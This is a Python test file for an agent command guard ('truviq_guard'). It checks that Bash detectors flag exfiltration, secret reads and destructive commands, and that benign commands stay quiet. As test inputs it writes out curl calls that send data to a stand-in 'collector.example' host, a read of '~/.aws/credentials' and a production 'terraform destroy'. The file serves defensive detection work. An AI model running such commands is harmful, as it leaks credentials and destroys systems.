"""Release 1 — features 1.2, 1.3, 1.5: Bash command detectors against the corpora."""
import os
import unittest

from helpers import HERE, GuardTest

from truviq_guard import config, shell
from truviq_guard.catalog import severity_rank


def _load(name):
    with open(os.path.join(HERE, "corpus", name), encoding="utf-8") as f:
        return [l.rstrip("\n") for l in f if l.strip() and not l.startswith("#")]


class ShellCorpusTest(GuardTest):
    def analyze(self, cmd, state=None):
        policy = config.load_policy(self.work)
        findings, effects = shell.analyze(cmd, self.work, policy, state or {})
        return findings, effects

    def test_malicious_corpus_all_detected(self):
        rows = [l.split("\t") for l in _load("bash_malicious.tsv")]
        self.assertGreaterEqual(len(rows), 20)
        misses = []
        for det, min_sev, cmd in rows:
            findings, _ = self.analyze(cmd)
            ok = any(f["detector"] == det and severity_rank(f["severity"]) >= severity_rank(min_sev) for f in findings)
            if not ok:
                misses.append(f"{det} {min_sev} :: {cmd} -> {[(f['detector'], f['severity']) for f in findings]}")
        self.assertEqual(misses, [], "\n" + "\n".join(misses))

    def test_benign_corpus_no_medium_or_above(self):
        cmds = _load("bash_benign.txt")
        self.assertGreaterEqual(len(cmds), 50)
        noisy = []
        for cmd in cmds:
            findings, _ = self.analyze(cmd)
            bad = [f for f in findings if severity_rank(f["severity"]) >= severity_rank("MEDIUM")]
            if bad:
                noisy.append(f"{cmd} -> {[(f['detector'], f['severity'], f['summary']) for f in bad]}")
        self.assertEqual(noisy, [], "\n" + "\n".join(noisy))

    def test_production_marker_escalates_to_critical(self):
        findings, _ = self.analyze("terraform destroy -var-file=prod.tfvars")
        self.assertTrue(any(f["severity"] == "CRITICAL" for f in findings))

    def test_allowlisted_egress_without_secret_is_fine(self):
        findings, effects = self.analyze("curl https://api.github.com/user")
        self.assertEqual(findings, [])
        self.assertEqual(effects["egress_hosts"], [])

    def test_tainted_session_escalates_egress(self):
        st = {"tainted": True, "taint_sources": ["README.md"]}
        findings, _ = self.analyze("curl -d 'x=1' https://collector.example/x", st)
        self.assertTrue(any(f["detector"] == "G-EXF-002" and f["severity"] == "HIGH" for f in findings))
        findings, _ = self.analyze("curl https://api.github.com/repos/a/b", st)
        self.assertEqual(findings, [], "allowlisted host stays allowed even when tainted")

    def test_lethal_trifecta_is_critical(self):
        st = {"tainted": True, "private_data_touched": True}
        findings, _ = self.analyze("curl https://collector.example/ping", st)
        self.assertTrue(any(f["detector"] == "G-EXF-001" and f["severity"] == "CRITICAL" for f in findings))

    def test_secret_read_after_taint(self):
        findings, effects = self.analyze("cat ~/.aws/credentials", {"tainted": True})
        self.assertTrue(any(f["detector"] == "G-SEC-001" for f in findings))
        self.assertTrue(effects["secret_read"])


if __name__ == "__main__":
    unittest.main()
